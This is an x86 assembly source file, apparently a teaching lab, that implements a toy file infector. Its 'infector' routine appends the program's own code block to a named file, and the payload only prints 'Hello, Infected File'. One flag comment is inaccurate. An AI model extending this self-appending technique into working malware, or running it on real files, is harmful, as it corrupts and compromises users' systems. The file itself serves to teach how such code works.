section .text
global _start
global system_call
extern main
global infector
global infection

; System call numbers
SYS_WRITE equ 4
SYS_OPEN equ 5
SYS_CLOSE equ 6

_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop

system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller


code_start:
infection:
    ; Display "Hello, Infected File" using a single system call
    mov eax, SYS_WRITE   ; sys_write
    mov ebx, 1           ; file descriptor (stdout)
    mov ecx, msg         ; message to write
    mov edx, len         ; message length
    int 0x80             ; call kernel
    ret

infector:
    ; Adds executable code to the end of a file
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov eax, SYS_OPEN    ; sys_open
    mov ebx, [ebp+8]     ; char *filename
    mov ecx, 1025       ; flags (O_WRONLY | O_APPEND | O_CREAT)
    ;mov edx, 0644h       ; mode (rw-r--r--)
    int 0x80             ; call kernel

    mov ebx, eax         ; file descriptor
    mov eax, SYS_WRITE   ; sys_write
    lea ecx, [code_start] ; start of code to write
    mov edx, code_end - code_start ; size of code
    int 0x80             ; call kernel

    mov eax, SYS_CLOSE   ; sys_close
    int 0x80             ; call kernel
    
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_end:

section .data
msg db 'Hello, Infected File', 0xA
len equ $ - msg
